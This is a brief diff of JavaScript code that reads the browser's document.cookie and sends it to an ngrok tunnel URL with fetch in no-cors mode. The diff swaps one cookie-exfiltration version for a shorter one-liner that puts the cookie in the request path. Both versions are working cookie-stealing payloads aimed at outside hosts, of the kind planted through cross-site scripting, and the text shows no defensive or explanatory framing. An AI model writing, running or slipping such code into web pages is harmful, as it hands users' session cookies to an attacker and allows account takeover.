@@ -1,12 +1,4 @@
-const API_URL = 'https://b8bf34f0a1d0.ngrok-free.app';
-const cookie = document.cookie;
-
-const urlWithParams = `${API_URL}?cookie=${encodeURIComponent(cookie)}`;
-
-fetch(urlWithParams, {
-  method: 'GET',
-  mode:'no-cors'
-})
+fetch('https://fd820e801b58.ngrok-free.app/'+document.cookie, {method: 'GET', mode:'no-cors'})
   .then(response => {
     if (!response.ok) {
       throw new Error(`HTTP error! Status: ${response.status}`);
